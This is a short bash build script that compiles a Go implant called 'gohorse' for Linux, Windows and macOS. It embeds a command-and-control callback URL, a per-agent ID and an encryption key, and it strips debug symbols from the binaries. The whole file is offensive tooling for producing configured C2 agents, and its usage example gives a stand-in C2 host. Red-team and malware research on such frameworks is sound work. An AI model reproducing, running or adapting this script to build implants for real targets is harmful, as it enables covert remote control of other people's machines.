#!/bin/bash

# This script compiles the Go agent for multiple platforms,
# injecting the C2 URL, a unique agent ID, and an encryption key.

# --- Configuration ---
AGENT_ID=$1
C2_URL=$2
ENCRYPTION_KEY=$3
OUTPUT_DIR="../../bin"

# --- Validation ---
if [ -z "$AGENT_ID" ] || [ -z "$C2_URL" ] || [ -z "$ENCRYPTION_KEY" ]; then
  echo "Usage: ./build.sh <agent-id> <c2-url> <encryption-key>"
  echo "Example: ./build.sh agent-007 http://your-c2.com/callback $(openssl rand -hex 16)"
  exit 1
fi

if [ ${#ENCRYPTION_KEY} -ne 32 ]; then
    echo "Error: Encryption key must be 32 characters long."
    exit 1
fi

# --- Preparation ---
BASE_NAME="gohorse-$AGENT_ID"
LDFLAGS=(
  "-w -s" # Strip debug information to reduce binary size
  "-X main.AgentID=$AGENT_ID"
  "-X main.C2_URL=$C2_URL"
  "-X main.EncryptionKey=$ENCRYPTION_KEY"
)

# Convert array to a single string
LDFLAGS_STR="$(IFS=' '; echo "${LDFLAGS[*]}")"

mkdir -p $OUTPUT_DIR

# --- Compilation ---
echo "[+] Compiling for Linux (amd64)..."
GOOS=linux GOARCH=amd64 go build -ldflags="$LDFLAGS_STR" -o "$OUTPUT_DIR/$BASE_NAME-linux-amd64" main.go crypto.go

echo "[+] Compiling for Windows (amd64)..."
GOOS=windows GOARCH=amd64 go build -ldflags="$LDFLAGS_STR" -o "$OUTPUT_DIR/$BASE_NAME-windows-amd64.exe" main.go crypto.go

echo "[+] Compiling for macOS (amd64)..."
GOOS=darwin GOARCH=amd64 go build -ldflags="$LDFLAGS_STR" -o "$OUTPUT_DIR/$BASE_NAME-macos-amd64" main.go crypto.go

echo "[+] Compilation complete. Binaries available in $OUTPUT_DIR"
